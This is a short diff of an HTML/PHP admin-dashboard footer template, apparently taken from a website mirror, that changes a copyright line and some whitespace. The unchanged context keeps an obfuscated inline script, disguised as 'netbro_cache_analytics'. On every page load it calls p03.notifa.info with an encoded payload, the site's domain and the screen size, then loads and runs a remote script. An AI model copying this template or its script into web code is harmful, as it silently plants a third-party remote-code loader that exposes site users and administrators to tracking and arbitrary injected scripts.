@@ -5,7 +5,7 @@
     <footer class="sticky-footer">
       <div class="container">
         <div class="text-center">
-          <small>Copyright © FinDoctor 2017</small>
+          <small>Copyright © HMPFEB 2018</small>
         </div>
       </div>
     </footer>
@@ -47,7 +47,7 @@
     <script src="<?= base_url(); ?>assets/modal/admin_section/js/admin.js"></script>
 	<!-- Custom scripts for this page-->
     <script src="<?= base_url(); ?>assets/modal/admin_section/js/admin-charts.js"></script>
-	
+
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mr1yKtlBTTNHvMIPr7mpIO2FFZsMVJUZzyCM%2bLGAidT1qKIoVfefxW8RtHAnHK5rhNpZzHtsSb4SKyf0kVrQwlpRJcTR5KlZVdMnn3lWByyO%2fjmaDxip66xGuiXKp0a6Bn0JbFxmA2rfaO366chxZb%2bSmXifjLfVa93yCHOVanVgpGj8WAbUWjBywO8QeDnn1wl%2fpHc3euZkxxf1g0nggUDtpkz84C%2fB7pyxkTp4EAPRiSE8hnR6JTf%2bYZdLeliyL6vbvWZrh%2bp9GyMJm8LuOLF%2fUPK2dkQ0yzwVB8tFTJz0U9AqC65biCNjN0lDQckPfju%2fTpy%2bMiZV7nFFsRsVLDQooVMMsazE4k631chItHiewmRHxhT51lhJ6vdpFUhjmFmmnfn6YnMXqCz2Z89c%2f5TtMfmmBvV%2fql1UMtrXGtLhbYX7EGgcYFap3Tt4NNOUGWm244ftsYdKNGCioxMyhlUtP2bc68EkKCTNLXEOTM0MKw9I25gW9BobngnqYTNSs" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 <!-- Mirrored from www.ansonika.com/findoctor/admin_section/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 24 Apr 2018 14:29:32 GMT -->
